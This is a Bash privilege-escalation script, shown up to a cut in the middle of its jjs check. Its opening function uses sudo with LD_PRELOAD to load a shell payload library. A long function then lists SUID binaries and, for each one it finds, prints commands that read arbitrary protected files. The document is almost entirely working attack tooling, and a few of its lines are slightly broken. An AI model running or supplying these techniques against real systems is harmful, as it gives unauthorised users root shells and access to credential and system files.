#!/bin/bash

function ld_payload_exploit {
    echo "Exploiting..."
    sudo LD_PRELOAD=./ldpayloadshell.so find
}

function read_file_exploit {

    vulnerableFound=0

    echo $'\n\e[1m\e[4m\e[36mFILE READ VULNERABILITIES\e[0m'

    binary=$(command -v alpine)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'alpine\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nalpine -F "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v ar)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'ar\' has its SUID bit turned on. Read any file using the following sequence of commands:\nTF=$(mktemp -u)\nLFILE=file_to_read\nar r "$TF" "$LFILE"\ncat "$TF"\e[0m'
        fi
    fi

    binary=$(command -v arp)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'arp\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\narp -v -f "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v as)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'as\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nas @$LFILE\e[0m'
        fi
    fi

    binary=$(command -v ascii-xfr)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'ascii-xfr\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nascii-xfr -ns "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v aspell)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'aspell\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\naspell -c "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v atobm)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'atobm\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\natobm $LFILE 2>&1 | awk -F "\'" \'{printf "%s", $2}\'\e[0m'
        fi
    fi

    binary=$(command -v awk)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'awk\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nawk \'//\' "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v base32)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'base32\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nbase32 "$LFILE" | base32 --decode\e[0m'
        fi
    fi

    binary=$(command -v base64)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'base64\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nbase64 "$LFILE" | base64 --decode\e[0m'
        fi
    fi

    binary=$(command -v basenc)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'basenc\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64\e[0m'
        fi
    fi

    binary=$(command -v basez)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'basez\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nbasez "$LFILE" | basez --decode\e[0m'
        fi
    fi

    binary=$(command -v bash)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'bash\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/bash/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v bc)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'bc\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nbc -s $LFILE\nquit\e[0m'
        fi
    fi

    binary=$(command -v bridge)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
        echoecho $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'bridge\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nbridge -force -batch "$LFILE\e[0m"'
        fi
    fi

    binary=$(command -v busybox)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'busybox\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/busybox/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v bzip2)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'bzip2\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nbzip2 -c $LFILE | bzip2 -d\e[0m'
        fi
    fi

    binary=$(command -v cat)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'cat\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ncat "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v cmp)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'cmp\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ncmp $LFILE /dev/zero -b -l"\e[0m'
        fi
    fi

    binary=$(command -v column)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'column\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ncolumn $LFILE\e[0m'
        fi
    fi

    binary=$(command -v comm)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'comm\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null\e[0m'
        fi
    fi

    binary=$(command -v cp)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'cp\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ncp "$LFILE" /dev/stdout\e[0m'
        fi
    fi

    binary=$(command -v cpio)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'cpio\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\necho "$LFILE" | cpio -o\e[0m'
        fi
    fi

    binary=$(command -v csplit)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'csplit\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\e[0m'
        fi
    fi

    binary=$(command -v csvtool)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'csvtool\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ncsvtool trim t $LFILE\e[0m'
        fi
    fi

    binary=$(command -v cupsfilter)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'cupsfilter\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ncupsfilter -i application/octet-stream -m application/octet-stream $LFILE\e[0m'
        fi
    fi

    binary=$(command -v curl)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'curl\' has its SUID bit turned on. Read any file using the following sequence of commands (File path must be absolute!):\nLFILE=/tmp/file_to_read\ncurl file://$LFILE\e[0m'
        fi
    fi

    binary=$(command -v cut)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'cut\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ncut -d "" -f1 "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v date)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'date\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ndate -f $LFILE\e[0m'
        fi
    fi

    binary=$(command -v dd)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'dd\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ndd if=$LFILE\e[0m'
        fi
    fi

    binary=$(command -v dialog)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'dialog\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ndialog --textbox "$LFILE 0 0"\e[0m'
        fi
    fi

    binary=$(command -v diff)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'diff\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ndiff --line-format=%L /dev/null $LFILE\nOR list contents of directory:\nLFOLDER=folder_to_list\nTF=$(mktemp -d)\ndiff --recursive $TF $LFOLDER\e[0m'
        fi
    fi

    binary=$(command -v dig)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'dig\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ndig -f $LFILE\e[0m'
        fi
    fi

    binary=$(command -v docker)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'docker\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/docker/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v dosbox)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'dosbox\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ndosbox -c \'mount c /\' -c "type c:$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v dotnet)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'dotnet\' has its SUID bit turned on. Read any file using the following sequence of commands:\nexport LFILE=file_to_read\ndotnet fsi\nSystem.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable("LFILE"));;\e[0m'
        fi
    fi

    binary=$(command -v ed)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'ed\' has its SUID bit turned on. Read any file using the following sequence of commands:\ned file_to_read\n,p\nq\e[0m'
        fi
    fi

    binary=$(command -v emacs)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'emacs\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/emacs/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v eqn)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'eqn\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\neqn "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v espeak)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'espeak\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nespeak -qxf "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v expand)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'expand\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nexpand "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v expect)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'expect\' has its SUID bit turned on. Read any file using the following sequence of commands (Will likely print the first line and show an error message):\nLFILE=file_to_read\nexpect "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v file)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'file\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nfile -f "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v fmt)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'fmt\' has its SUID bit turned on. Read any file using the following sequence of commands (Only for GNU version of fmt):\nLFILE=file_to_read\nfmt -pNON_EXISTING_PREFIX "$LFILE"\nALSO TRY:\nLFILE=file_to_read\nfmt -999 "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v fold)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'fold\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nfold -w99999999 "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v gawk)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'gawk\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ngawk \'//\' "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v gcc)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'gcc\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ngcc -xc -E "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v gcore)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'gcore\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/gcore/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v gdb)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'gdb\' has its SUID bit turned on. Read any file using the following command:\ngdb -nx -ex \'python print(open("file_to_read").read())\' -ex quit\e[0m'
        fi
    fi

    binary=$(command -v genisoimage)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'genisoimage\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/genisoimage/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v gimp)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'gimp\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/gimp/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v git)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'git\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ngit diff /dev/null $LFILE\e[0m'
        fi
    fi

    binary=$(command -v grep)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'grep\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ngrep \'\' $LFILE\e[0m'
        fi
    fi

    binary=$(command -v gzip)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'gzip\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\ngzip -c $LFILE | gzip -d\e[0m'
        fi
    fi

    binary=$(command -v hd)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'hd\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nhd "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v head)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'head\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nhead -c1G "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v hexdump)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'hexdump\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nhexdump -C "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v highlight)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'highlight\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nhighlight --no-doc --failsafe "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v iconv)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'iconv\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\niconv -f 8859_1 -t 8859_1 "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v ip)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'ip\' has its SUID bit turned on. Read any file using the following sequence of commands:\nLFILE=file_to_read\nip -force -batch "$LFILE"\e[0m'
        fi
    fi

    binary=$(command -v irb)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            vulnerableFound=$((vulnerableFound + 1))
            echo $'\n\e[36m\e[1m('"$vulnerableFound"$')\e[0m\e[36m Binary \'irb\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/irb/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v jjs)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
